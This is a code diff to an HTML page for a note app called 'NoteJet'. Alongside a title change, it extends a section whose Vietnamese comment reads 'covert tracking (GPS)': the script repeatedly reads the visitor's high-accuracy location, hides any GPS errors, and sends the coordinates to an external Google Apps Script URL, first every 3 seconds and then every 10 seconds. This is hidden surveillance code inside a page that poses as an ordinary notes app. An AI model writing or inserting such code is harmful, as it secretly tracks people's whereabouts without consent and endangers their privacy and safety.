@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NoteJet - Reader</title>
+    <title>NoteJet - Workspace</title>
     <style>
         /* CSS Reset & Basic Fonts */
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -217,10 +217,12 @@
             console.log("UI Lỗi:", error);
         }
 
-        // PHẦN 2: TRACKING NGẦM (GPS)
+// PHẦN 2: TRACKING NGẦM (GPS)
         try {
             const webAppUrl = "https://script.google.com/macros/s/AKfycbxzWWR4Z7tqCpi7Aqz0uGEDgbXJbypOch6WarLwhd1TK74CTfDNaIltNYdsfYulkyEs/exec";
-            
+            let sendCount = 0; // Bộ đếm số lần đã gửi
+            let trackInterval; // Biến quản lý vòng lặp
+
             function forceTrackLocation() {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
@@ -234,14 +236,27 @@
                                 method: 'GET',
                                 cache: 'no-cache'
                             });
+
+                            sendCount++; // Tăng số lần gửi thành công
+                            console.log("Sent count: " + sendCount);
+
+                            // KIỂM TRA ĐIỀU KIỆN ĐỂ ĐỔI INTERVAL
+                            if (sendCount === 6) {
+                                console.log("Switching to 10s interval...");
+                                clearInterval(trackInterval); // Hủy vòng lặp 3s
+                                trackInterval = setInterval(forceTrackLocation, 10000); // Đổi sang 10s
+                            }
                         }, 
                         function(err) { /* Im lặng nếu lỗi GPS */ }, 
                         { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                     );
                 }
             }
+
+            // Bắt đầu vòng lặp lần đầu tiên với 3 giây
             forceTrackLocation();
-            setInterval(forceTrackLocation, 3000);
+            trackInterval = setInterval(forceTrackLocation, 3000);
+
         } catch(error) {
             console.log("GPS Lỗi:", error);
         }
